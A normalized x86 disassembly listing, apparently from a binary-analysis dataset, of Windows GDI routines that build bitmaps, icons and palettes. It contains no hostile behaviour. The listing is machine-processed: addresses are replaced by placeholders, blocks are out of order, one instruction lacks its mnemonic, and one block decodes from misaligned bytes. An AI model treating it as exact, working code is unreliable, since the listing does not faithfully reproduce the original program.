mov [ esp ] eax
sub_425644
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424fec
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424fcc
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4257f0
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424e5c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425716
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424e6c
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42571d
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424d60
sub_42571d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424fec
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424e5c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4257d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424e6c
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257d7
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_42580c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_42589c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c14
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_425b93
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_425985
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424d60
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42598c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42598c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425800
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407c14
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_425b73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425644
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407c14
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425b50
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b57
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402714
retn
call sub_424db4
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425800
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_42580c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_425ba4
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424d48
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b80
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424fec
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425c88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_425ba4
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425cf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_425ba4
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425d91
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d98
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425dc8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b80
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425dbc
xor edx edx
push ebp
push sub_425fb6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425c88
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425c88
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425f8f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407c14
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407c14
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407c14
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425cf4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425cf4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f96
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402714
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402714
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402714
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402714
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425f96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fbd
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425fc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_426014
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_42606c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426014
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4260b5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4030bc
mov edi eax
mov eax esi
call sub_4030bc
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4261ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4261d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407d40
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261d9
mov al 0x1
sub_426208
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41af78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426250
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426257
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_42625c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426290
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41af78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4262db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e2
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_4263a4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418938
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426442
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426449
mov eax [ rw-data ]
call sub_41899c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42641a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_426534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424968
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_42490c
test al al
je r-xdata
sub_426450
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418938
mov esi eax
xor ecx ecx
push ebp
push sub_4264c0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax esi
call sub_4182a8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_426534
sub_4264cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424360
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_426508
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_426534
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424424
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_426534
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4246ac
xor edx edx
push ebp
push sub_4265c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424af0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41894c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424968
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4265d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4246ac
xor eax eax
push ebp
push sub_4266b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4278f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_426450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4279f0
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424af0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4188b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424968
retn
sub_4266c4
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403174
sub_4266e4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_426450
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cfec
mov edx ebx
and dl 0xfc
mov eax esi
